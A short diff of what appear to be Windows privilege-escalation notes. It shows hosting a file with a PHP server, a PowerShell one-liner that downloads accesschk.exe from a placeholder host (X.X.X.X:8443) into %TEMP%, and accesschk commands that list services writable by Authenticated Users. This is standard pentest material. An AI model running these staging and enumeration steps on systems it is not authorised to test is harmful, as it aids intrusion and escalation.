@@ -23,4 +23,8 @@ wget https://live.sysinternals.com/accesschk.exe
 
 php -S 0.0.0.0:8443
 
-Get File : powershell -c “(New-Object System.Net.WebClient).DownloadFile(‘http://X.X.X.X:8443/accesschk.exe’,’%TEMP%\KayDosya.exe’)”
+Get File : powershell -c “(New-Object System.Net.WebClient).DownloadFile(‘http://X.X.X.X:8443/accesschk.exe’,’%TEMP%\accesschk.exe’)”
+
+accesschk.exe /accepteula -uwcqv “Authenticated Users” *
+
+accesschk.exe /accepteula -ucqv AppMgmt
